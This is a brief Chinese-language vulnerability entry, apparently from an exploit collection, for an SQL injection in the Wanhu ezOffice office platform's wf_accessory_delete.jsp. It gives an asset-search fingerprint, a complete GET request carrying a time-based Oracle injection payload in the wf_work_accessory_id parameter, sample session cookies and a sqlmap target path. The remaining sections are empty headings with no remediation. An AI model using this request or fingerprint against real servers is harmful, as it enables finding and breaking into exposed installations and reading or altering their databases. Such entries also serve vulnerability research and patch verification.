# 万户协同办公平台ezofficewf_accessory_delete存在SQL注入漏洞

- **系统**：万户协同办公平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`GET /defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1+AND+2582%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%28106%29%7C%7CCHR%28100%29%7C%7CCHR%2865%29%2C5%29 HTTP/1.1`
- **关键头**：`Cookie: OASESSIONID=52562B9365841755B2D1E02E88D5C06C; OASESSIONID=6E0FF3351156C2BB0306BB…`

**请求体 / payload**
```

sqlmap
/defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1
```

**其他**
- 万户协同办公平台ezoffice wf\_accessory\_delete 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice